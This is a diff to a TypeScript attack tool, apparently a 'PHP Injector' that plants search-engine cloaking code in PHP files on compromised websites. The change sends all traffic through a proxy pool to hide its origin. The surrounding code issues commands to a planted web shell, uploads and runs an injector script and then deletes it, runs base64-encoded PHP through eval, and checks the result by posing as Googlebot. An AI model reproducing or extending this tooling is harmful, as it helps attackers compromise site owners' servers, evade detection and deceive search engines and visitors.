@@ -1,3 +1,12 @@
+import { fetchWithPoolProxy } from "./proxy-pool";
+
+// Helper: wrap fetch with proxy pool
+async function injectorFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+  return response;
+}
+
 /**
  * PHP Injector — Injects cloaking code into existing PHP files on target
  * 
@@ -299,12 +308,12 @@ export async function executeInjection(
         
         if (method === "GET") {
           const url = `${config.shellUrl}?${param}=${encodeURIComponent(phpCmd)}`;
-          response = await fetch(url, {
+          response = await injectorFetch(url, {
             headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
             signal: AbortSignal.timeout(15000),
           });
         } else {
-          response = await fetch(config.shellUrl, {
+          response = await injectorFetch(config.shellUrl, {
             method: "POST",
             headers: {
               "Content-Type": "application/x-www-form-urlencoded",
@@ -366,7 +375,7 @@ export async function executeInjection(
         // Execute the injector
         onProgress("🔧 กำลังรัน injector script...");
         try {
-          const execResponse = await fetch(uploadResult.url, {
+          const execResponse = await injectorFetch(uploadResult.url, {
             signal: AbortSignal.timeout(30000),
           });
           const execText = await execResponse.text();
@@ -390,7 +399,7 @@ export async function executeInjection(
           
           // Self-delete the injector after execution
           try {
-            await fetch(`${uploadResult.url}?cleanup=1`, { signal: AbortSignal.timeout(5000) });
+            await injectorFetch(`${uploadResult.url}?cleanup=1`, { signal: AbortSignal.timeout(5000) });
           } catch { /* ignore cleanup failure */ }
         } catch (e: any) {
           errors.push(`Injector execution failed: ${e.message}`);
@@ -425,7 +434,7 @@ export async function executeInjection(
         const targetBase = new URL(config.shellUrl).origin;
         const verifyUrl = `${targetBase}/${file.filename === "index.php" ? "" : file.filename}`;
         
-        const botResponse = await fetch(verifyUrl, {
+        const botResponse = await injectorFetch(verifyUrl, {
           headers: {
             "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
           },
@@ -545,7 +554,7 @@ async function uploadInjectorViaShell(
     for (const param of shellParams) {
       try {
         const url = `${shellUrl}?${param}=${encodeURIComponent(cmd)}`;
-        const response = await fetch(url, {
+        const response = await injectorFetch(url, {
           headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
           signal: AbortSignal.timeout(10000),
         });
@@ -555,7 +564,7 @@ async function uploadInjectorViaShell(
           const baseUrl = shellUrl.replace(/[^/]+$/, "");
           const fileUrl = `${baseUrl}${filename}`;
           
-          const checkResponse = await fetch(fileUrl, {
+          const checkResponse = await injectorFetch(fileUrl, {
             method: "HEAD",
             signal: AbortSignal.timeout(5000),
           });
@@ -609,7 +618,7 @@ echo $done > 0 ? "INJECT_OK" : "INJECT_FAIL";
       const phpCmd = `php -r "eval(base64_decode('${evalB64}'));"`;
       const url = `${config.shellUrl}?${param}=${encodeURIComponent(phpCmd)}`;
       
-      const response = await fetch(url, {
+      const response = await injectorFetch(url, {
         headers: { "User-Agent": "Mozilla/5.0" },
         signal: AbortSignal.timeout(15000),
       });
